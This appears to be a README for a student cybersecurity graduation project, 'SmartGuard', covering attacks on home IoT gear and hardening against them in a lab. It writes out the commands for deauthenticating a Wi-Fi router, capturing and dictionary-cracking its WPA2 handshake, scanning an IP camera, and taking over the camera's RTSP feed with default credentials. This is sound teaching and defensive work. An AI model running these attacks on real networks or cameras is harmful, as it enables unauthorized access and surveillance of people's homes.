<div align="center">

# 🏆 SmartGuard — IoT Security Audit Framework

**🥇 Winner · 1st Place Graduation Project Award**
Buraydah Colleges · Department of Cybersecurity · 2025/2026

[![Language](https://img.shields.io/badge/Language-Bash-green?style=flat-square&logo=gnubash)](smartguard.sh)
[![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-blue?style=flat-square&logo=kalilinux)](https://www.kali.org)
[![License](https://img.shields.io/badge/Use-Lab%20Only-red?style=flat-square)](#)
[![Status](https://img.shields.io/badge/Status-Complete-brightgreen?style=flat-square)](#)

</div>

---

## 📌 Project Overview

As IoT devices become integral to smart homes, security often lags behind convenience. This project demonstrates how weak configurations in consumer-grade IP cameras can lead to severe privacy breaches — then shows exactly how to fix them.

We built **SmartGuard**, an interactive Bash framework that automates three security phases in a controlled lab environment:

| Phase | Tool | Goal |
|-------|------|------|
| 01 · Wireless Attack | `aircrack-ng` suite | Crack WPA2 & gain LAN access |
| 02 · Reconnaissance | `nmap` | Discover IoT devices & open ports |
| 03 · Hardening Verify | Custom checklist + `nmap` | Confirm Defense-in-Depth applied |

---

## 🎯 Objectives

- Perform wireless deauthentication attacks to capture WPA2 handshakes
- Crack weak passwords using dictionary attacks (`rockyou.txt`)
- Map IoT devices on the internal network after gaining access
- Exploit unencrypted RTSP video streams on IP cameras
- Apply and verify a **Defense-in-Depth** hardening strategy
- Measure attack surface reduction after hardening

---

## 🏗️ Lab Network Topology

```
[ Attacker Machine (Kali Linux) ]
        │
        │  ① Deauth + Handshake Capture (aircrack-ng)
        ▼
[ Wi-Fi Router ] ──── [ IP Camera (192.168.8.186) ]
        │                       │
        │                  Port 80  (HTTP Admin)
        │                  Port 554 (RTSP Stream)  ← ② Exploited
        │
        └─ ③ After Hardening: Camera moved to isolated IoT VLAN
```

---

## ⚡ Attack Methodology

### Phase 01 · Wireless Network Exploitation

```bash
# Kill processes that interfere with monitor mode
sudo airmon-ng check kill

# Enable monitor mode on wireless interface
sudo airmon-ng start wlan0

# Scan for surrounding networks — identify target BSSID & channel
sudo airodump-ng wlan0mon

# Capture WPA2 4-way handshake from target router
sudo airodump-ng --bssid 1E:4A:44:D1:44:4B --channel 6 -w handshake_capture wlan0mon

# Force client to reconnect (triggers handshake re-broadcast)
sudo aireplay-ng --deauth 20 -a 1E:4A:44:D1:44:4B -c FF:FF:FF:FF:FF:FF wlan0mon

# Dictionary brute-force against captured handshake
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake_capture-01.cap
```

**Result:** `KEY FOUND! [ 12345678 ]` — default weak password cracked in seconds.

---

### Phase 02 · Network Reconnaissance & Device Discovery

```bash
# Host discovery — map all active devices on the local subnet
sudo nmap -sn 192.168.8.0/24

# Service version scan on the IP camera — focus on web & RTSP ports
sudo nmap -sV -p 80,554,8080,443,22,23,21 192.168.8.186

# Deep scan with OS detection and banner grabbing
sudo nmap -sV -O --script=http-title,banner -p 80,554 192.168.8.186
```

**Open ports found on camera:**

| Port | Protocol | Risk | Finding |
|------|----------|------|---------|
| 80   | HTTP     | ⚠️ Medium | Admin panel, no HTTPS, default credentials |
| 554  | RTSP     | 🔴 High   | Live video stream, unencrypted, no auth |

---

### Phase 03 · Exploitation — Video Stream Hijack

```
# Access live feed using default credentials over exposed RTSP
rtsp://admin:admin@192.168.8.186:554/live
```

Open in **VLC Media Player** → full unauthorized access to home camera feed achieved.

---

## 🛡️ Defense & Hardening (Mitigation)

After demonstrating the attacks, we implemented a **Defense-in-Depth** strategy:

### Actions Taken

1. **Credential Hardening** — Changed default `admin:admin` to a strong, unique password
2. **Protocol Disabling** — Disabled RTSP (Port 554) entirely from camera settings
3. **Network Segmentation** — Moved IoT devices to a dedicated isolated VLAN
4. **SSID Hiding** — Hid the IoT network SSID to reduce passive reconnaissance

### Post-Hardening Validation

```bash
# Verify RTSP is disabled after hardening
sudo nmap -p 554 192.168.8.186
# Expected: 554/tcp  closed  rtsp
```

---

## 📊 Results

| Security Control | Before Hardening | After Hardening |
|-----------------|-----------------|-----------------|
| Wi-Fi Password | `12345678` (weak) | Strong & unique ✅ |
| Camera Password | `admin:admin` (default) | Changed ✅ |
| RTSP Port 554 | Open & exposed 🔴 | Closed ✅ |
| HTTP Port 80 | Open, no HTTPS 🟡 | Restricted ✅ |
| Network | Shared with main LAN 🔴 | Isolated VLAN ✅ |
| SSID Visibility | Publicly broadcast 🟡 | Hidden ✅ |
| **Overall Risk** | **HIGH 🔴** | **LOW 🟢** |

> **Attack surface reduced by ~80%** in post-hardening verification scans.

---

## 🔧 SmartGuard Tool

This project includes **SmartGuard** (`smartguard.sh`) — an interactive Bash framework we developed to automate the entire audit workflow.

### Features

- Colored terminal UI with progress indicators
- Step-by-step guided execution with confirmations
- Automatic session logging to `/tmp/smartguard_*.log`
- Post-session report generation
- Dependency checker (aircrack-ng, nmap, xterm)
- Hardening score calculator (0–5 checks with % reduction metric)

### Installation & Usage

```bash
# Clone the repository
git clone https://github.com/YOUR_USERNAME/IoT-SmartGuard-Security.git
cd IoT-SmartGuard-Security

# Make executable
chmod +x smartguard.sh

# Run with root privileges (required for airmon-ng and nmap)
sudo ./smartguard.sh
```

### Main Menu

```
  MAIN MENU  — اختر المرحلة
  ──────────────────────────────────────────────────────────────
  [1]  Phase 01 → Wireless Attack & Handshake Capture
  [2]  Phase 02 → Network Reconnaissance & Port Scan
  [3]  Phase 03 → Hardening Verification Checklist
  [4]  Full Run → تشغيل المراحل الثلاث تسلسلياً
  [5]  Report  → توليد تقرير الجلسة
  [6]  Check Deps → فحص الأدوات المثبتة
  [0]  خروج
```

### Requirements

```bash
# Install all dependencies on Kali Linux / Debian
sudo apt update && sudo apt install -y aircrack-ng nmap xterm

# Decompress wordlist if needed
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

> ⚠️ **For use in authorized lab environments only.** Unauthorized use on real networks is illegal.

---

## 👥 Team

| Name | Role |
|------|------|
| Sulaiman Almanea | Team Lead & Attack Phase |
| Muath Alyhya | Wireless Security & Testing |
| Abdulaziz Alharbi | Network Reconnaissance |
| Majed Alghrras | Hardening & Documentation |
| Mansour Alsuwayh | Tool Development & Reporting |

**Supervisor:** Dr. Ahmed Elaraby · Department of Cybersecurity · Buraydah Colleges

---

## 📁 Repository Structure

```
IoT-SmartGuard-Security/
├── smartguard.sh           # Main audit framework (Bash)
├── README.md               # This file
└── docs/
    └── Graduation_Project_v7.0.pdf   # Full written report
```

---

<div align="center">

**Buraydah Colleges · Cybersecurity Department · Final Year Project 2025/2026**

*"Securing Smart Homes — One Vulnerability at a Time"*

</div>
